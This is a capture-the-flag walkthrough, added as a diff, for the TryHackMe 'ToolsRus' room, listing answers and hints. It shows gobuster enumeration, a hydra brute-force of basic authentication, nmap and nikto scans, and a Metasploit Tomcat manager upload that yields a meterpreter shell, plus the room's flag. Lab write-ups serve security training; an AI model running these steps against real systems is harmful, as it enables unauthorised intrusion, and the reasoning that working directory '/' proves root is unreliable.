@@ -1,0 +1,122 @@
+#### Link to room: https://tryhackme.com/room/toolsrus
+
+#### [Task 1] ToysRus
+   1. guidelines
+> Hint: 
+>
+> Typed in the following command into the terminal: 
+>
+> "gobuster dir -u \<GIVEN-IP-ADDRESS\> -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt" 
+   2. bob
+> Hint: 
+>
+> From the output in task 1, you should see some discovered directories
+>
+> Navigate to the page in a browser: 
+>
+> http://\<GIVEN-IP-ADDRESS\>/guidelines/
+   3. protected
+> Hint: 
+>
+> From the output in task 1, you should see some discovered directories
+>
+> Navigate to the page in a browser: 
+>
+> http://\<GIVEN-IP-ADDRESS\>/guidelines/
+>
+> You will then be prompted for basic authentication 
+   4. bubbles
+> Hint: 
+>
+> Type the following command into terminal: 
+>
+> hydra -l bob -P /usr/share/wordlists/rockyou.txt \<GIVEN-IP-ADDRESS\> http-get /protected
+   5. 1234
+> Hint: 
+>
+> Type in the command "nmap -sC -sV \<GIVEN-IP-ADDRESS\>"
+>
+> -sC = Use default scripts to scan the IP address 
+>
+> -sV = Use for service/version detection 
+>
+> You should get an ouput like this 
+```
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 65:1a:c9:84:d6:1b:78:6c:e4:3a:64:ca:ea:e6:11:92 (RSA)
+|   256 a2:ab:a9:d3:4d:a2:31:70:21:5c:b4:8b:a4:6c:1c:cc (ECDSA)
+|_  256 6b:7e:6a:ab:46:3a:e2:cb:38:e9:84:9d:05:a8:53:33 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+|_http-favicon: Apache Tomcat
+|_http-server-header: Apache-Coyote/1.1
+|_http-title: Apache Tomcat/7.0.88
+8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
+|_ajp-methods: Failed to get a valid response for the OPTION request
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+```
+> You can see that on port 1234 there are also HTTP running so therefore it is that port since port 8009 has no HTTP running on it
+   6. Apache Tomcat/7.0.88
+> Hint
+>
+> Looking at the NMAP output you should be able to see something like "http-title:"
+>
+> This contains the information for the service name and port 
+   7. 5
+> Hint: 
+>
+> For me the nikto scan didnt work however a command something like would work: 
+>
+> nikto -id bob:bubbles -h http://\<GIVEN-IP-ADDRESS\>:1234/manager/html
+>
+> In addition if you navigate to "http://\<GIVEN-IP-ADDRESS\>:1234/manager/html" on a browser 
+>
+> And enter the credentials found for question 4 
+>
+> You will be able to see the documents there too
+>
+   8. Apache/2.4.18
+> Hint
+>
+> Looking at the NMAP output you should be able to see something like "http-server-header" for port 80 
+   9. 1.1
+> Hint
+>
+> Looking at the NMAP output you should be able to see something like "http-server-header" for port 1234 
+   10.
+> Hint: 
+>
+> From out nmap scan we saw that the version for Apache Tomcat was 7.0.88
+>
+> If we were to search for "Apache Tomcat/7.0.88 exploit metasploit" into google
+>
+> We should come across this (web page)[https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload]
+>
+> If we type "msfconsole" into a terminal 
+>
+> Then type "use exploit/multi/http/tomcat_mgr_upload"
+>
+> And "set rhost \<GIVEN-IP-ADDRESS\>"
+>
+> And "set HttpPassword bubbles"
+>
+> And "set HttpUsername bob" 
+>
+> And "set rport 1234" 
+>
+> And finally type "run"
+>
+> We should get a meterpreter shell 
+>
+> If you type "pwd" for print working directory 
+>
+> We will see that we are in the "/" directory meaning that we are the root user 
+   11. ff1fc4a81affcc7688cf89ae7dc6e0e1
+> Hint: 
+>
+> Type the command "cat /root/flag.txt" to get the answer
